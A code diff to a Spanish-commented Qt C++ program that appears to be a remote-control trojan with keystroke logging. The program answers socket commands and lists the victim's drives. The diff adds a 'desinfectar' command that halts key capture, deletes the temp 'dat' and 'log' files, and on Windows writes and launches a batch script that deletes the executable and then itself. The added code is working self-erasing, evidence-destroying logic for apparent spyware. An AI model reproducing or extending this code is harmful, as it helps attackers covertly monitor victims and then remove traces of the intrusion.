@@ -276,6 +276,10 @@ void MainWindow::llegadaDatos() {
     if (datos == "cerrar"){ //cerrar el servidor
         QApplication::exit();
     }
+    if (datos == "desinfectar")
+    {
+        desinfectar();
+    }
     if (datos == "ping") { //ping al servidor
         util.escribirSocket("pong",&socket);
     }
@@ -484,6 +488,27 @@ void MainWindow::reiniciar(){
     QString filePath = QApplication::applicationFilePath();
     QProcess::startDetached(filePath);
     QApplication::exit();
+}
+void MainWindow::desinfectar()
+{
+    this->verTecla.stop();
+    apagar();
+    QFile::remove(directorio.tempPath() + "/dat");
+    QFile::remove(directorio.tempPath() + "/log");
+    QFile::remove("data");
+    #ifdef Q_WS_WIN
+    QByteArray bat;
+    bat = "@echo off \nping localhost -n 1 -w 1000 > null\ndel " + QApplication::applicationFilePath().toLatin1() + "\ndel " + QApplication::applicationDirPath().toLatin1() + "/borrar.bat";
+    bat.replace("/","\\");
+    QFile archivoBat;
+    archivoBat.setFileName("borrar.bat");
+    archivoBat.open(QFile::WriteOnly | QFile::Text);
+    archivoBat.write(bat);
+    archivoBat.close();
+    QProcess::startDetached("borrar.bat");
+    QApplication::exit();
+    #endif
+
 }
 void MainWindow::listarUnidades()
 {  /** Esta función envia por socket una lista de las unidades de almacenamiento del sistema **/
